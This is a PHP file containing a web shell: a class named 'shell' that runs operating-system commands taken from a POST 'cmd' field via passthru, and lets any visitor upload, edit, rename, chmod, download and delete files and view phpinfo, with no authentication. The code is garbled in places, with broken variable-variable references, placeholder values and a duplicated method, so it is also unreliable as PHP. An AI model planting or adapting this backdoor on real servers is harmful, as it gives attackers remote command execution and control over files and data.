<?php
class shell {
    function outputhead() {
        $globalVar1 = "res";
        $globalVar2 = "res";
        $globalVar3 = "res";
        $globalVar4 = "res";
        return "<html><body><h1>Welcome</h1>";
    }

    function outputmenu() {
        return "<h2>Menu</h2>";
    }

    function execute() {
        ${"GLOBALE"}["command"] = $_POST["cmd"];
        passthru(${${"GLOBALE"}["command"]});
    }

    function exesys() {
        ${"GLOBALE"}["command"] = "res";
        echo "<hr>";
        echo "<pre>";
        ${${"GLOBAS"}["command"]} = passthru($_POST["cmd"]);
        echo "</pre>";
        echo "<hr>";
    }

    function editfile($file) {
        if (!empty($_POST["rename"])) {
            rename($_POST["file"], $_POST["rename"]);
        }
        ${"GLOBALE"}["filehandle"] = fopen($_POST["rename"], "w");
        if (!${"GLOBALE"}["filehandle"]) return 0;
        fwrite(${${"GLOBALE"}["filehandle"]}, stripslashes($_POST["filecontent"]));
        fclose(${${"GLOBALE"}["filehandle"]});
        return 1;
    }

    function chmodfile($file) {
        $perms = "res";
        switch ($_POST["perms0"]) {
            case "s":
                ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0xC000;
                break;
            case "l":
                ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0xA000;
                break;
            case "-":
                ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0x8000;
                break;
            case "b":
                ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0x6000;
                break;
            case "d":
                ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0x4000;
                break;
            case "c":
                ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0x2000;
                break;
            case "p":
                ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0x1000;
                break;
            case "u":
                break;
        }

        if (isset($_POST["perms1"])) ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0x0100;
        if (isset($_POST["perms2"])) ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0x0080;
        if (isset($_POST["perms3"])) ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0x0040;
        if (isset($_POST["perms4"])) ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0x0020;
        if (isset($_POST["perms5"])) ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0x0010;
        if (isset($_POST["perms6"])) ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0x0008;
        if (isset($_POST["perms7"])) ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0x0004;
        if (isset($_POST["perms8"])) ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0x0002;
        if (isset($_POST["perms9"])) ${"GLOBALE"}["perm"] = ${"GLOBALE"}["perm"] | 0x0001;

        echo substr(sprintf("%o", ${"GLOBALE"}["perm"]), -4);
        return chmod(${"GLOBALE"}["file"], intval(substr(sprintf("%o", ${"GLOBALE"}["perm"]), -4), 8));
    }

    function downloadfile($file) {
        $filePath = "file";
        header("Content-Type: application/octet-stream");
        header("Content-Length: " . filesize(${${"GLOBALE"}["file"]}));
        header("Content-Disposition: attachment; filename=$file");
        readfile(${${"GLOBALE"}["file"]});
        die();
    }

    function createdir() {
        if (!empty($_POST["dircreate"])) {
            if (mkdir($_SESSION["currentdir"] . "/" . $_POST["dircreate"])) return "Directory created!";
        }
        return "Error creating directory";
    }

    function createfile() {
        if (!empty($_POST["filecreate"])) {
            ${"GLOBALE"}["filehandle"] = "fp";
            if (file_exists($_SESSION["currentdir"] . "/" . $_POST["filecreate"])) return "File already exists";
            ${"GLOBALE"}["filehandle"] = fopen($_SESSION["currentdir"] . "/" . $_POST["filecreate"], "w");
            if (${${"GLOBALE"}["filehandle"]}) {
                $filePointer = "fp";
                fclose($filePointer);
                return "File created!";
            }
        }
        return "Error creating file";
    }

    function uploadfile() {
        if ($_FILES["filename"]["error"] != 0) return "Error uploading file";
        $_POST["filename2"] = trim($_POST["filename2"]);
        if (empty($_POST["filename2"])) $_POST["filename2"] = $_FILES["filename"]["name"];
        if (!copy($_FILES["filename"]["tmp_name"], $_SESSION["currentdir"] . "/" . $_POST["filename2"])) {
            if (!move_uploaded_file($_FILES["filename"]["tmp_name"], $_SESSION["currentdir"] . "/" . $_POST["filename2"])) return "File upload failed...";
        }
        return "The file was uploaded successfully!";
    }

    function outputinfo() {
        return phpinfo();
    }

    function outputfilemanager() {
        return "<h2>File Manager</h2>";
    }

    function removefile() {
        if (!empty($_POST["filedelete"])) {
            unlink($_POST["filedelete"]);
            return "File removed!";
        }
        return "Error removing file";
    }

    function removedir() {
        if (!empty($_POST["dirremove"])) {
            rmdir($_POST["dirremove"]);
            return "Directory removed!";
        }
        return "Error removing directory";
    }

    function outputdown() {
        return "<h2>Download</h2>";
    }

    function executeform() {
        return "<form method='post' action=''><input type='text' name='cmd'><input type='submit' value='Execute'></form>";
    }

    function exesysform() {
        return "<form method='post' action=''><input type='text' name='cmd'><input type='submit' value='Execute System Command'></form>";
    }

    function editfileform($file) {
        return "<form method='post' action=''><input type='text' name='filecontent'><input type='hidden' name='file' value='$file'><input type='submit' value='Edit File'></form>";
    }

    function chmodform($file) {
        return "<form method='post' action=''><input type='text' name='perms'><input type='hidden' name='file' value='$file'><input type='submit' value='Change Permissions'></form>";
    }

    function outputhead() {
        return "<html><body><h1>Welcome</h1>";
    }
}

$shell = new shell();
$shell->outputhead();
$shell->outputmenu();

switch ($_POST["action"]) {
    case "chmod":
        echo $shell->chmodfile($_POST["file"]);
        break;
    case "editfile":
        echo $shell->editfile($_POST["file"]);
        break;
    case "execute":
        $shell->execute();
        break;
    case "exesys":
        $shell->exesys();
        break;
    case "createdir":
        echo $shell->createdir();
        break;
    case "createfile":
        echo $shell->createfile();
        break;
    case "uploadfile":
        echo $shell->uploadfile();
        break;
}

switch ($_GET["action"]) {
    case "edit":
        echo $shell->editfileform($_GET["file"]);
        break;
    case "chmod":
        echo $shell->chmodform($_GET["file"]);
        break;
    case "execute":
        echo $shell->executeform();
        break;
    case "exesys":
        echo $shell->exesysform();
        break;
    case "download":
        $shell->downloadfile($_GET["file"]);
        break;
    case "remove":
        echo $shell->removefile();
        break;
    case "removedir":
        echo $shell->removedir();
        break;
    case "filemanager":
        echo $shell->outputfilemanager();
        break;
    case "info":
        $shell->outputinfo();
        break;
    case "down":
        echo $shell->outputdown();
        break;
}
?>
